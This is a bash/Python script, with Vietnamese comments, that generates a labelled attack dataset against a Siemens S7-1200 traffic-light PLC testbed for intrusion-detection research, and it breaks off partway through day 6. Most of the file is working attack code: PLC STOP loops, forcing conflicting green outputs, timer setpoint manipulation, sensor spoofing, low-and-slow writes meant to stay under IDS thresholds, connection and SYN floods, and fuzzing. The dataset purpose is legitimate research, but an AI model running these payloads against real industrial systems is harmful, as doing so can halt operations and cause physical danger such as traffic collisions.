#!/bin/bash
set -euo pipefail

# ================================================================
# run_day.sh — ICS Attack Dataset Collection (Traffic Light S7-1200)
# ================================================================
#
# Kill chain thực tế của kẻ tấn công ICS:
#   Ngày 1: Baseline — 100% benign, thu baseline traffic
#   Ngày 2: Reconnaissance — scan, thu thập thông tin PLC
#   Ngày 3: Initial Impact — CPU STOP + force dangerous output
#   Ngày 4: Process Manipulation — setpoint + sensor spoof
#   Ngày 5: Denial of Service — flood + fuzz
#
# Tham chiếu thực tế:
#   - Stuxnet: reconnaissance → setpoint manipulation → sensor spoof
#   - Industroyer: CPU STOP/START + protocol flooding
#   - MITRE ATT&CK for ICS: T0846, T0861, T0816, T0836, T0856, T0814
#   - S7-1200 Security Research (Langner, Klick et al.)
#
# Cách chạy:
#   Máy CONTROLLER: bash run_day.sh --day 1 --role controller \
#                       --target 192.168.1.10 --iface eth0
#   Máy ATTACKER:   bash run_day.sh --day 3 --role attacker \
#                       --target 192.168.1.10 --iface eth0
# ================================================================

[[ -f testbed.conf ]] && source ./testbed.conf

if [[ -z "${PY_CMD:-}" ]]; then
    command -v python3 &>/dev/null && PY_CMD="python3" || PY_CMD="python"
fi

DAY=""
ROLE=""
TARGET_IP="${TARGET_IP:-192.168.1.10}"
IFACE="${IFACE:-eth0}"
SESSION_ID=""

while [[ $# -gt 0 ]]; do
    case $1 in
        --day)        DAY="$2";        shift 2 ;;
        --role)       ROLE="$2";       shift 2 ;;
        --target)     TARGET_IP="$2";  shift 2 ;;
        --iface)      IFACE="$2";      shift 2 ;;
        --session-id) SESSION_ID="$2"; shift 2 ;;
        *) echo "[ERROR] Unknown: $1"; exit 1 ;;
    esac
done

[[ -z "$DAY" ]]  && { echo "Thieu --day (1-6)";  exit 1; }
[[ -z "$ROLE" ]] && { echo "Thieu --role";        exit 1; }
[[ -z "$SESSION_ID" ]] && SESSION_ID="day${DAY}_s1"

mkdir -p "captures/day${DAY}" logs labels

declare -a PIDS=()
cleanup() { for p in "${PIDS[@]:-}"; do kill "$p" 2>/dev/null || true; done; }
trap cleanup EXIT INT TERM

echo "=== run_day.sh  day=$DAY  role=$ROLE  target=$TARGET_IP ==="

# ── Ghi label CSV ────────────────────────────────────────────────
label() {
    local scenario=$1 action=$2
    local ts; ts=$($PY_CMD -c "import time; print(int(time.time()*1000))")
    local f="labels/day${DAY}_${SESSION_ID}_timeline.csv"
    [[ ! -f "$f" ]] && echo "attacker_timestamp_ms,scenario_label,action,session_id" > "$f"
    echo "${ts},${scenario},${action},${SESSION_ID}" >> "$f"
    echo "[$(date +%H:%M:%S)] >>> $scenario  $action"
}

wait_s() { echo "[wait] $2 -- ${1}s"; sleep "$1"; }

# ── Khôi phục PLC về trạng thái an toàn sau tấn công ────────────
restore_plc() {
    echo "[restore] Khoi phuc PLC..."
    $PY_CMD - <<PYEOF
import snap7, time
try:    from snap7.type import Areas
except: from snap7.types import Areas
from snap7.util import set_bool, set_dint
try:
    c = snap7.client.Client()
    c.connect('$TARGET_IP', 0, 1)

    # 1. Neu PLC dang STOP thi hot-start hoac cold-start lai
    try:
        state = c.get_cpu_state()
        if 'Stop' in str(state) or state == 4:
            try:
                c.plc_hot_start()
                print('[restore] Sent PLC Hot Start')
            except Exception as e_hot:
                print(f'[restore] Hot Start failed ({e_hot}), trying Cold Start...')
                try:
                    c.plc_cold_start()
                    print('[restore] Sent PLC Cold Start')
                except Exception as e_cold:
                    print(f'[restore] Cold Start also failed ({e_cold})')
            time.sleep(3)
    except Exception as e_state:
        print(f'[restore] Failed to query state or restart: {e_state}')

    # 2. Reset Q output
    try:
        c.write_area(Areas.PA, 0, 0, bytearray([0]))
        print('[restore] Reset Q Output success')
    except Exception as e_q:
        print(f'[restore] Failed to reset Q output: {e_q}')

    # 3. Doc M area va reset tag + set START = 1 de kich hoat logic
    try:
        m = c.read_area(Areas.MK, 0, 0, 82)
        set_bool(m, 2, 1, 1)    # START = 1 (Kich hoat logic den chay lai)
        set_bool(m, 2, 2, 0)    # STOP  = 0
        set_bool(m, 28, 0, 0)   # s1 = 0
        set_bool(m, 28, 1, 0)   # s4 = 0
        set_bool(m, 28, 2, 0)   # s2 = 0
        set_bool(m, 28, 3, 0)   # s3 = 0
        # Reset setpoint timer ve gia tri thuc te hop ly
        set_dint(m,  3, 30000)  # TimeR1 = 30s
        set_dint(m,  8, 30000)  # TimeR2 = 30s
        set_dint(m, 12,  3000)  # TimeY1 = 3s
        set_dint(m, 16,  3000)  # TimeY2 = 3s
        set_dint(m, 20, 25000)  # TimeG1 = 25s
        set_dint(m, 24, 25000)  # TimeG2 = 25s
        c.write_area(Areas.MK, 0, 0, m)
        print('[restore] Set START=1 and setpoints reset')
        
        # Cho 1 giay de PLC ghi nhan bit START roi tra START ve 0
        time.sleep(1.0)
        m = c.read_area(Areas.MK, 0, 0, 82)
        set_bool(m, 2, 1, 0)    # START = 0
        c.write_area(Areas.MK, 0, 0, m)
        print('[restore] Reset START=0 (pulse completed)')
    except Exception as e_m:
        print(f'[restore] Failed to write M area: {e_m}')

    c.disconnect()
    print('[restore] OK')
except Exception as e:
    print(f'[restore] General error: {e}')
PYEOF
    sleep 2
}

# ================================================================
# CONTROLLER — tshark + log_tags + HMI benign
# ================================================================
run_controller() {
    local pcap="captures/day${DAY}/${SESSION_ID}_controller.pcapng"
    tshark -n -i "$IFACE" -f "host $TARGET_IP" -w "$pcap" -q &
    PIDS+=("$!"); echo "[ctrl] tshark -> $pcap"

    $PY_CMD log_tags.py \
        --target "$TARGET_IP" --interval 0.5 \
        --output "logs/day${DAY}_${SESSION_ID}_tags.csv" &
    PIDS+=("$!"); echo "[ctrl] log_tags started"

    # HMI benign: SCADA đọc data mỗi 1-2s (giả lập vận hành bình thường)
    $PY_CMD -c "
import snap7, time, random
try:    from snap7.type import Areas
except: from snap7.types import Areas
c = snap7.client.Client()
print('[HMI] SCADA polling started', flush=True)
while True:
    try:
        if not c.get_connected(): c.connect('$TARGET_IP', 0, 1)
        c.read_area(Areas.MK, 0, 0, 82)
        c.read_area(Areas.PA, 0, 0, 1)
        time.sleep(random.uniform(1.0, 2.0))
    except: time.sleep(2)
" &
    PIDS+=("$!"); echo "[ctrl] HMI benign started"

    label "BENIGN_NORMAL" "START"
    wait_s 14400 "Controller running 4h"
    label "BENIGN_NORMAL" "END"
}

# ================================================================
# ATTACKER — Kill chain thực tế
# ================================================================
run_attacker() {
    local pcap="captures/day${DAY}/${SESSION_ID}_attacker.pcapng"
    tshark -n -i "$IFACE" -f "host $TARGET_IP" -w "$pcap" -q &
    PIDS+=("$!"); echo "[att] tshark -> $pcap"

    # ── Ngày 1: IDLE ─────────────────────────────────────────────
    if [[ "$DAY" == "1" ]]; then
        label "BENIGN_NORMAL" "START"
        wait_s 14400 "Day 1 attacker idle"
        label "BENIGN_NORMAL" "END"

    # ── Ngày 2: Reconnaissance ───────────────────────────────────
    # Kẻ tấn công thực tế BẮT ĐẦU bằng việc thu thập thông tin:
    #   1. Dùng nmap tìm port S7comm (102)
    #   2. Kết nối S7 lấy CPU info (model, firmware, protection)
    #   3. Đọc data PLC liên tục để hiểu logic điều khiển
    # Đây là giai đoạn CHUẨN BỊ trước khi tấn công thật
    elif [[ "$DAY" == "2" ]]; then
        label "BENIGN_NORMAL" "START"; wait_s 1800 "warmup"; label "BENIGN_NORMAL" "END"

        # SCAN_PORT — nmap tìm port 102 (S7comm)
        # Giống Stuxnet dùng nmap -T1 để quét mạng ICS
        # SCAN_PORT — Dùng s7pwn scan thay vì nmap để không cần quyền Admin
        # Kẻ tấn công dùng s7pwn quét mạng dò tìm PLC
        label "SCAN_PORT" "START"
        (
            while true; do
                $PY_CMD -m s7pwn scan "$TARGET_IP/32" --protocols s7 --auto >/dev/null 2>&1 || true
                sleep 55  # Lặp để đủ window
            done
        ) &
        NP=$!; PIDS+=("$NP")
        wait_s 600 "SCAN_PORT"
        kill "$NP" 2>/dev/null || true
        label "SCAN_PORT" "END"

        label "BENIGN_NORMAL" "START"; wait_s 600 "recovery"; label "BENIGN_NORMAL" "END"

        # ENUM_TAGS — Kẻ tấn công đọc toàn bộ vùng nhớ để hiểu cấu trúc PLC
        # Thực tế: sau khi scan port, bước tiếp theo là đọc data PLC
        #   - Đọc CPU info (model, firmware version)
        #   - Đọc CPU state (RUN/STOP)
        #   - Đọc tất cả M area, Q area để hiểu logic điều khiển
        # Rate 5 Hz >> benign HMI (0.5-1 Hz) → phân biệt được
        label "ENUM_TAGS" "START"
        $PY_CMD - <<PYEOF &
import snap7, time
try:    from snap7.type import Areas
except: from snap7.types import Areas
c = snap7.client.Client()
c.connect('$TARGET_IP', 0, 1)

# Ke tan cong thu thap thong tin PLC truoc
try:
    info = c.get_cpu_info()
    print(f'[ENUM] CPU: {info.ModuleTypeName} {info.SZL_ID}', flush=True)
    state = c.get_cpu_state()
    print(f'[ENUM] CPU state: {state}', flush=True)
except Exception as e:
    print(f'[ENUM] Info: {e}')

# Doc tat ca vung nho de hieu logic dieu khien
n = 0
while True:
    try:
        if not c.get_connected(): c.connect('$TARGET_IP', 0, 1)
        m = c.read_area(Areas.MK, 0, 0, 82)   # Toan bo M area
        q = c.read_area(Areas.PA, 0, 0, 1)    # Q output
        n += 1
        if n % 100 == 0:
            print(f'[ENUM] {n} reads: Q0=0x{q[0]:02X} M2=0x{m[2]:02X}', flush=True)
    except: pass
    time.sleep(0.2)   # 5 Hz
PYEOF
        EP=$!; PIDS+=("$EP")
        wait_s 1200 "ENUM_TAGS"
        kill "$EP" 2>/dev/null || true
        label "ENUM_TAGS" "END"

        label "BENIGN_NORMAL" "START"; wait_s 9000 "cooldown"; label "BENIGN_NORMAL" "END"

    # ── Ngày 3: Initial Impact ───────────────────────────────────
    # Sau khi biết cấu trúc PLC (ngày 2), kẻ tấn công bắt đầu tấn công:
    #   1. CPU STOP — lệnh dừng PLC trực tiếp (mạnh nhất, ít dấu vết network nhất)
    #   2. RWRITE_BURST — force output nguy hiểm (cả 2 hướng đèn xanh)
    elif [[ "$DAY" == "3" ]]; then
        label "BENIGN_NORMAL" "START"; wait_s 1800 "warmup"; label "BENIGN_NORMAL" "END"

        # CPU_STOP — Gửi lệnh STOP trực tiếp tới PLC
        # Đây là attack THỰC TẾ NHẤT và NGUY HIỂM NHẤT với S7 PLC:
        #   - Metasploit module: siemens_s7_300_400_plc_control dùng chính lệnh này
        #   - Industroyer/CrashOverride dùng STOP command để cắt điện Ukraine 2016
        #   - S7-1200 không bảo vệ lệnh STOP ở protection level 1 (default)
        # Hậu quả: PLC dừng ngay lập tức → tất cả output về 0 → đèn tắt hết
        # Feature PLC: plc_mode=0 (STOP), Running=0, polling_error tăng
        # Feature network: S7comm PDU type 0x01 (Job) + function 0x29 (PLC STOP)
        label "CPU_STOP" "START"
        $PY_CMD - <<PYEOF &
import snap7, time
try:    from snap7.type import Areas
except: from snap7.types import Areas
c = snap7.client.Client()
c.connect('$TARGET_IP', 0, 1)
n = 0
print('[CPU_STOP] Starting periodic PLC STOP attack', flush=True)
while True:
    try:
        if not c.get_connected(): c.connect('$TARGET_IP', 0, 1)
        # Goi lenh STOP PLC — day la lenh S7comm hop le
        c.plc_stop()
        n += 1
        print(f'[CPU_STOP] #{n}: PLC STOP sent', flush=True)
        time.sleep(5)   # De PLC o trang thai STOP 5s

        # Hot-start lai (giong ke tan cong "kiem tra" PLC co dung lai ko)
        try:
            c.plc_hot_start()
            print(f'[CPU_STOP] #{n}: PLC restarted', flush=True)
        except: pass
        time.sleep(10)  # Cho PLC khoi dong lai 10s

    except Exception as e:
        print(f'[CPU_STOP] {e}')
        time.sleep(5)
PYEOF
        CP=$!; PIDS+=("$CP")
        wait_s 900 "CPU_STOP"
        kill "$CP" 2>/dev/null || true
        restore_plc
        label "CPU_STOP" "END"

        label "BENIGN_NORMAL" "START"; wait_s 1800 "recovery"; label "BENIGN_NORMAL" "END"

        # RWRITE_BURST — Force Q output nguy hiểm: cả 2 hướng đèn XANH đồng thời
        # Thực tế: sau khi biết địa chỉ Q output (từ enum ngày 2),
        #          kẻ tấn công ghi trực tiếp vào Process Output area
        # Hậu quả vật lý: Green1=1 VÀ Green2=1 cùng lúc = 2 hướng cùng được đi
        #                 → va chạm giao thông nghiêm trọng
        #
        # Q0 byte = 0b11000010 = 0xC2:
        #   bit1=Running(1), bit2=Red1(0), bit3=Red2(0), bit4=Y1(0),
        #   bit5=Y2(0), bit6=Green1(1), bit7=Green2(1)
        #
        # Feature PLC: green_conflict=1, q0_raw=0xC2=194, q_output_unexpected=1
        # Feature network: S7 write PDU tới PA area, rate 10/s
        label "RWRITE_BURST" "START"
        $PY_CMD - <<PYEOF &
import snap7, time
try:    from snap7.type import Areas
except: from snap7.types import Areas
c = snap7.client.Client()
c.connect('$TARGET_IP', 0, 1)
# Q0 = Running + Green1 + Green2 = collision state
# 0b11000010: bit7=Green2, bit6=Green1, bit1=Running
COLLISION = bytearray([0b11000010])
n = 0
print('[RWRITE] Forcing both directions GREEN = COLLISION RISK', flush=True)
while True:
    try:
        if not c.get_connected(): c.connect('$TARGET_IP', 0, 1)
        c.write_area(Areas.PA, 0, 0, COLLISION)
        n += 1
        if n % 100 == 0:
            print(f'[RWRITE] {n} writes: Q0=0xC2 (Green1=Green2=1)', flush=True)
    except: pass
    time.sleep(0.1)  # 10 writes/s
PYEOF
        RP=$!; PIDS+=("$RP")
        wait_s 1200 "RWRITE_BURST"
        kill "$RP" 2>/dev/null || true
        restore_plc
        label "RWRITE_BURST" "END"

        label "BENIGN_NORMAL" "START"; wait_s 7200 "cooldown"; label "BENIGN_NORMAL" "END"

    # ── Ngày 4: Process Manipulation ────────────────────────────
    # Giai đoạn tinh vi hơn: thay vì dừng PLC (dễ phát hiện),
    # kẻ tấn công thay đổi process values để gây hậu quả mà khó detect hơn
    # Giống Stuxnet Phase 2: không dừng máy, chỉ thay đổi setpoint âm thầm
    elif [[ "$DAY" == "4" ]]; then
        label "BENIGN_NORMAL" "START"; wait_s 1800 "warmup"; label "BENIGN_NORMAL" "END"

        # SETPOINT_ATTACK — Thay đổi timer setpoint của đèn giao thông
        # Thực tế: Stuxnet chính xác làm điều này với centrifuge (thay speed setpoint)
        #          Mục tiêu: ghi vào Time tags (không phải timer counter thực tế)
        #
        # Attack targets (đúng địa chỉ tag thực tế):
        #   TimeG1 (MD20) = 25000ms → 1000ms   (đèn xanh hướng 1 chỉ còn 1s)
        #   TimeG2 (MD24) = 25000ms → 1000ms   (đèn xanh hướng 2 chỉ còn 1s)
        #   TimeR1 (MD3)  = 30000ms → 60000ms  (đèn đỏ hướng 1 tăng lên 60s)
        #   TimeR2 (MD8)  = 30000ms → 60000ms  (đèn đỏ hướng 2 tăng lên 60s)
        # → Xanh quá ngắn (1s) + Đỏ quá dài (60s) = giao thông hỗn loạn
        #
        # Feature PLC: TimeG1_mean << 3000 (dưới MIN_SAFE), timer_out_of_range=1
        # Feature network: S7 write PDU tới M area (offset 3,8,20,24), rate 2/s
        label "SETPOINT_ATTACK" "START"
        $PY_CMD - <<PYEOF &
import snap7, time
try:    from snap7.type import Areas
except: from snap7.types import Areas
from snap7.util import set_dint
c = snap7.client.Client()
c.connect('$TARGET_IP', 0, 1)
n = 0
print('[SETPOINT] Manipulating traffic light timers (Stuxnet-style)', flush=True)
print('[SETPOINT] TimeG1=TimeG2=1000ms (unsafe), TimeR1=TimeR2=60000ms', flush=True)
while True:
    try:
        if not c.get_connected(): c.connect('$TARGET_IP', 0, 1)
        m = c.read_area(Areas.MK, 0, 0, 82)
        set_dint(m,  3, 60000)  # TimeR1 = 60s (MD3)  -- do tang len (xe cho lau)
        set_dint(m,  8, 60000)  # TimeR2 = 60s (MD8)
        set_dint(m, 20,  1000)  # TimeG1 = 1s  (MD20) -- xanh qua ngan, xe khong kip
        set_dint(m, 24,  1000)  # TimeG2 = 1s  (MD24)
        c.write_area(Areas.MK, 0, 0, m)
        n += 1
        if n % 60 == 0:
            print(f'[SETPOINT] {n} writes: G1=G2=1s, R1=R2=60s', flush=True)
    except: pass
    time.sleep(0.5)  # 2 writes/s
PYEOF
        SP=$!; PIDS+=("$SP")
        wait_s 1200 "SETPOINT_ATTACK"
        kill "$SP" 2>/dev/null || true
        restore_plc
        label "SETPOINT_ATTACK" "END"

        label "BENIGN_NORMAL" "START"; wait_s 1800 "recovery"; label "BENIGN_NORMAL" "END"

        # SENSOR_SPOOF — Ghi đè giá trị cảm biến để che giấu thực trạng
        # Thực tế: Stuxnet ghi fake centrifuge speed → operators không biết máy đang hỏng
        #          BATADAL attack scenario: fix sensor value để bypass threshold alarm
        #
        # Attack target: M28 (s1, s4, s2, s3 bits)
        #   Bình thường: cảm biến dao động 0/1 theo xe qua
        #   Tấn công: ép tất cả = 1 liên tục → PLC không biết hướng nào không có xe
        #
        # Hậu quả: PLC không thể tắt đèn xanh đúng lúc → xe xếp hàng vô tận
        #
        # Feature PLC: s1=s2=s3=s4=1.0 liên tục (không dao động = bất thường)
        # Feature network: S7 write PDU tới offset M28 mỗi 0.5s
        label "SENSOR_SPOOF" "START"
        $PY_CMD - <<PYEOF &
import snap7, time
try:    from snap7.type import Areas
except: from snap7.types import Areas
c = snap7.client.Client()
c.connect('$TARGET_IP', 0, 1)
n = 0
print('[SPOOF] Fixing all sensor bits = 1 (hiding real traffic state)', flush=True)
print('[SPOOF] Target: M28 = 0x0F (s1=s4=s2=s3=1)', flush=True)
while True:
    try:
        if not c.get_connected(): c.connect('$TARGET_IP', 0, 1)
        # M28 = 0x0F = 0b00001111: s1(b0)=s4(b1)=s2(b2)=s3(b3)=1
        c.write_area(Areas.MK, 0, 28, bytearray([0x0F]))
        n += 1
        if n % 100 == 0:
            print(f'[SPOOF] {n} writes: M28=0x0F all sensors=1', flush=True)
    except: pass
    time.sleep(0.5)  # 2 writes/s
PYEOF
        SS=$!; PIDS+=("$SS")
        wait_s 1800 "SENSOR_SPOOF"
        kill "$SS" 2>/dev/null || true
        restore_plc
        label "SENSOR_SPOOF" "END"

        label "BENIGN_NORMAL" "START"; wait_s 1800 "recovery"; label "BENIGN_NORMAL" "END"

        # STEALTHY_WRITE — Ghi STOP bit chậm để không kích IDS threshold
        # Thực tế: tấn công rate thấp (Low-and-Slow) để tránh bị phát hiện
        #          1 write/2s << threshold IDS thông thường (thường >10 event/min)
        # Hậu quả: PLC liên tục bị dừng → vận hành gián đoạn → khó trace nguyên nhân
        # Challenge AI: network feature gần như không khác benign
        #               → AI phải dựa vào PLC tags: STOP=1, Running=0, no_light_d1/d2=1
        label "STEALTHY_WRITE" "START"
        $PY_CMD - <<PYEOF &
import snap7, time
try:    from snap7.type import Areas
except: from snap7.types import Areas
from snap7.util import set_bool
c = snap7.client.Client()
c.connect('$TARGET_IP', 0, 1)
n = 0
print('[STEALTHY] Low-and-slow: writing STOP bit every 2s', flush=True)
print('[STEALTHY] Rate: 0.5/s (below typical IDS threshold)', flush=True)
while True:
    try:
        if not c.get_connected(): c.connect('$TARGET_IP', 0, 1)
        m = c.read_area(Areas.MK, 0, 2, 1)
        set_bool(m, 0, 2, 1)               # M2.2 = STOP = 1
        c.write_area(Areas.MK, 0, 2, m)
        n += 1
        if n % 15 == 0:
            print(f'[STEALTHY] {n} writes: M2.2=STOP=1', flush=True)
    except: pass
    time.sleep(2)  # 1 write/2s
PYEOF
        SW=$!; PIDS+=("$SW")
        wait_s 1800 "STEALTHY_WRITE"
        kill "$SW" 2>/dev/null || true
        restore_plc
        label "STEALTHY_WRITE" "END"

        label "BENIGN_NORMAL" "START"; wait_s 5400 "cooldown"; label "BENIGN_NORMAL" "END"

    # ── Ngày 5: Denial of Service ────────────────────────────────
    # Giai đoạn cuối: phá hủy tính sẵn sàng — SCADA mất giám sát
    elif [[ "$DAY" == "5" ]]; then
        label "BENIGN_NORMAL" "START"; wait_s 1800 "warmup"; label "BENIGN_NORMAL" "END"

        # S7_FLOOD — Flood S7 connection để PLC từ chối kết nối SCADA
        # Thực tế: S7-1200 mặc định chỉ cho phép 6-8 kết nối đồng thời
        #          Khi kết nối đầy: SCADA mất kết nối, không đọc được data
        # Giống Industroyer: chiếm giữ kết nối để operator mù thông tin
        # Feature network: rất nhiều TCP SYN-SYNACK-FIN trong thời gian ngắn
        # Feature PLC: polling_error_sum tăng, plc_connected_mean giảm, read_latency tăng
        label "S7_FLOOD" "START"
        $PY_CMD - <<PYEOF &
import snap7, time, threading
n_ok = 0
n_fail = 0
lock = threading.Lock()

def flood_worker():
    global n_ok, n_fail
    while True:
        try:
            c = snap7.client.Client()
            c.connect('$TARGET_IP', 0, 1)
            # Giu ket noi mot chut roi dong (chiem slot)
            time.sleep(0.1)
            c.disconnect()
            with lock:
                n_ok += 1
                if n_ok % 100 == 0:
                    print(f'[FLOOD] {n_ok} connections, {n_fail} fails', flush=True)
        except:
            with lock: n_fail += 1

# 8 thread = vuot gioi han ket noi S7-1200
threads = [threading.Thread(target=flood_worker, daemon=True) for _ in range(8)]
for t in threads: t.start()
print('[FLOOD] 8 threads flooding S7 connections (limit: 6-8)', flush=True)
for t in threads: t.join()
PYEOF
        FP=$!; PIDS+=("$FP")
        wait_s 600 "S7_FLOOD"
        kill "$FP" 2>/dev/null || true
        restore_plc
        label "S7_FLOOD" "END"

        label "BENIGN_NORMAL" "START"; wait_s 1800 "recovery"; label "BENIGN_NORMAL" "END"

        # SYN_FLOOD — TCP SYN flood port 102
        # Thực tế: flooding TCP stack để PLC không trả lời được S7comm
        # hping3 là tool chuẩn của penetration tester ICS (documented nhiều paper)
        # Feature network: hàng ngàn packet/s, chỉ SYN không có SYNACK từ attacker
        # Feature PLC: PLC overloaded → polling_error=1, plc_connected giảm về 0
        label "SYN_FLOOD" "START"
        if command -v hping3 &>/dev/null; then
            hping3 -S -p 102 --flood "$TARGET_IP" >/dev/null 2>&1 &
            SFP=$!; PIDS+=("$SFP")
            echo "[att] hping3 SYN flood started"
        else
            echo "[WARN] hping3 khong co, dung python socket thay"
            $PY_CMD - <<PYEOF &
import socket, threading, time
def syn_worker():
    while True:
        try:
            s = socket.socket()
            s.settimeout(0.05)
            s.connect(('$TARGET_IP', 102))
            s.close()
        except: pass
threads = [threading.Thread(target=syn_worker, daemon=True) for _ in range(30)]
for t in threads: t.start()
print('[SYN] 30 threads flooding port 102', flush=True)
for t in threads: t.join()
PYEOF
            SFP=$!; PIDS+=("$SFP")
        fi
        wait_s 300 "SYN_FLOOD"
        kill "$SFP" 2>/dev/null || true
        restore_plc
        label "SYN_FLOOD" "END"

        label "BENIGN_NORMAL" "START"; wait_s 1800 "recovery"; label "BENIGN_NORMAL" "END"

        # PROTOCOL_FUZZ — Gửi malformed S7 PDU để exploit PLC firmware
        # Thực tế: ICS fuzzing là kỹ thuật nghiên cứu bảo mật chuẩn
        #          Paper: "Fuzzing IEC 61850 / S7" (Berthier 2014, Klick 2015)
        #          Tool: Boofuzz, s7fuzzer — đây là phiên bản đơn giản hóa
        # Feature network: TCP connection tới port 102, payload entropy ≈ 8 (max)
        #                  Không có S7comm header hợp lệ (0x03 0x00 ...)
        label "PROTOCOL_FUZZ" "START"
        $PY_CMD - <<PYEOF &
import socket, os, time, struct
n = 0
print('[FUZZ] Sending malformed S7 PDUs to port 102', flush=True)
while True:
    try:
        s = socket.socket()
        s.settimeout(1)
        s.connect(('$TARGET_IP', 102))

        # Variant 1: pure random (no valid TPKT/S7 header)
        s.send(os.urandom(50))
        s.close()

        n += 1
        if n % 50 == 0:
            print(f'[FUZZ] {n} malformed PDUs sent', flush=True)
    except: pass
    time.sleep(0.1)
PYEOF
        FZP=$!; PIDS+=("$FZP")
        wait_s 600 "PROTOCOL_FUZZ"
        kill "$FZP" 2>/dev/null || true
        restore_plc
        label "PROTOCOL_FUZZ" "END"

        label "BENIGN_NORMAL" "START"; wait_s 4200 "cooldown"; label "BENIGN_NORMAL" "END"

    # ── Ngày 6: Mixed Test Day (Tập Test đánh giá sau khi Train) ────
    # Ngày 6 kết hợp tất cả các kịch bản tấn công ở trên với thứ tự và thời gian khác nhau,
    # giúp đánh giá tổng thể độ nhạy, tính chính xác và tránh bị overfit của AI model.
    elif [[ "$DAY" == "6" ]]; then
        label "BENIGN_NORMAL" "START"; wait_s 1800 "warmup"; label "BENIGN_NORMAL" "END"

        # 1. SCAN_PORT (10m)
        label "SCAN_PORT" "START"
        (
            while true; do
                $PY_CMD -m s7pwn scan "$TARGET_IP/32" --protocols s7 --auto >/dev/null 2>&1 || true
                sleep 55
            done
        ) &
        NP=$!; PIDS+=("$NP")
        wait_s 600 "SCAN_PORT"
        kill "$NP" 2>/dev/null || true
        label "SCAN_PORT" "END"

        label "BENIGN_NORMAL" "START"; wait_s 600 "recovery"; label "BENIGN_NORMAL" "END"

        # 2. ENUM_TAGS (20m)
        label "ENUM_TAGS" "START"
        $PY_CMD - <<PYEOF &
import snap7, time
try:    from snap7.type import Areas
except: from snap7.types import Areas
c = snap7.client.Client()
c.connect('$TARGET_IP', 0, 1)
try:
    info = c.get_cpu_info()
    print(f'[ENUM] CPU: {info.ModuleTypeName} {info.SZL_ID}', flush=True)
    state = c.get_cpu_state()
    print(f'[ENUM] CPU state: {state}', flush=True)
except Exception as e:
    print(f'[ENUM] Info: {e}')
n = 0
while True:
    try:
        if not c.get_connected(): c.connect('$TARGET_IP', 0, 1)
        m = c.read_area(Areas.MK, 0, 0, 82)
        q = c.read_area(Areas.PA, 0, 0, 1)
        n += 1
        if n % 100 == 0:
            print(f'[ENUM] {n} reads: Q0=0x{q[0]:02X} M2=0x{m[2]:02X}', flush=True)
    except: pass
    time.sleep(0.2)
PYEOF
        EP=$!; PIDS+=("$EP")
        wait_s 1200 "ENUM_TAGS"
        kill "$EP" 2>/dev/null || true
        label "ENUM_TAGS" "END"

        label "BENIGN_NORMAL" "START"; wait_s 600 "recovery"; label "BENIGN_NORMAL" "END"

        # 3. CPU_STOP (10m)
        label "CPU_STOP" "START"
        $PY_CMD - <<PYEOF &
import snap7, time
try:    from snap7.type import Areas
except: from snap7.types import Areas
c = snap7.client.Client()
c.connect('$TARGET_IP', 0, 1)
n = 0
print('[CPU_STOP] Starting periodic PLC STOP attack', flush=True)
while True:
    try:
        if not c.get_connected(): c.connect('$TARGET_IP', 0, 1)
        c.plc_stop()
        n += 1
        print(f'[CPU_STOP] #{n}: PLC STOP sent', flush=True)
        time.sleep(5)
        try:
            c.plc_hot_start()
            print(f'[CPU_STOP] #{n}: PLC restarted', flush=True)
        except: pass
        time.sleep(10)
    except Exception as e:
        print(f'[CPU_STOP] {e}')
        time.sleep(5)
PYEOF
        CP=$!; PIDS+=("$CP")
        wait_s 600 "CPU_STOP"
        kill "$CP" 2>/dev/null || true
        restore_plc
        label "CPU_STOP" "END"

        label "BENIGN_NORMAL" "START"; wait_s 600 "recovery"; label "BENIGN_NORMAL" "END"

        # 4. RWRITE_BURST (20m)
        label "RWRITE_BURST" "START"
        $PY_CMD - <<PYEOF &
import snap7, time
try:    from snap7.type import Areas
except: from snap7.types import Areas
c = snap7.client.Client()
c.connect('$TARGET_IP', 0, 1)
COLLISION = bytearray([0b11000010])
n = 0
print('[RWRITE] Forcing both directions GREEN = COLLISION RISK', flush=True)
while True:
    try:
        if not c.get_connected(): c.connect('$TARGET_IP', 0, 1)
        c.write_area(Areas.PA, 0, 0, COLLISION)
        n += 1
        if n % 100 == 0:
            print(f'[RWRITE] {n} writes: Q0=0xC2 (Green1=Green2=1)', flush=True)
    except: pass
    time.sleep(0.1)
PYEOF
        RP=$!; PIDS+=("$RP")
        wait_s 1200 "RWRITE_BURST"
        kill "$RP" 2>/dev/null || true
        restore_plc
        label "RWRITE_BURST" "END"

        label "BENIGN_NORMAL" "START"; wait_s 600 "recovery"; label "BENIGN_NORMAL" "END"

        # 5. SETPOINT_ATTACK (20m)
        label "SETPOINT_ATTACK" "START"
        $PY_CMD - <<PYEOF &
import snap7, time
try:    from snap7.type import Areas
except: from snap7.types import Areas
from snap7.util import set_dint
c = snap7.client.Client()
c.connect('$TARGET_IP', 0, 1)
n = 0
print('[SETPOINT] Manipulating traffic light timers (Stuxnet-style)', flush=True)
while True:
    try:
        if not c.get_connected(): c.connect('$TARGET_IP', 0, 1)
        m = c.read_area(Areas.MK, 0, 0, 82)
        set_dint(m,  3, 60000)  # TimeR1 = 60s
        set_dint(m,  8, 60000)  # TimeR2 = 60s
        set_dint(m, 20,  1000)  # TimeG1 = 1s
        set_dint(m, 24,  1000)  # TimeG2 = 1s
        c.write_area(Areas.MK, 0, 0, m)
        n += 1
        if n % 60 == 0:
            print(f'[SETPOINT] {n} writes: G1=G2=1s, R1=R2=60s', flush=True)
    except: pass
    time.sleep(0.5)
PYEOF
        SP=$!; PIDS+=("$SP")
        wait_s 1200 "SETPOINT_ATTACK"
        kill "$SP" 2>/dev/null || true
        restore_plc
        label "SETPOINT_ATTACK" "END"

        label "BENIGN_NORMAL" "START"; wait_s 600 "recovery"; label "BENIGN_NORMAL" "END"

        # 6. SENSOR_SPOOF (20m)
        label "SENSOR_SPOOF" "START"
        $PY_CMD - <<PYEOF &
import snap7, time
try:    from snap7.type import Areas
except: from snap7.types import Areas
c = snap7.client.Client()
c.connect('$TARGET_IP', 0, 1)
n = 0
print('[SPOOF] Fixing all sensor bits = 1 (hiding real traffic state)', flush=True)
while True:
    try:
        if not c.get_connected(): c.connect('$TARGET_IP', 0, 1)
        c.write_area(Areas.MK, 0, 28, bytearray([0x0F]))
        n += 1
        if n % 100 == 0:
            print(f'[SPOOF] {n} writes: M28=0x0F all sensors=1', flush=True)
    except: pass
    time.sleep(0.5)
PYEOF
        SS=$!; PIDS+=("$SS")
        wait_s 1200 "SENSOR_SPOOF"
        kill "$SS" 2>/dev/null || true
        restore_plc
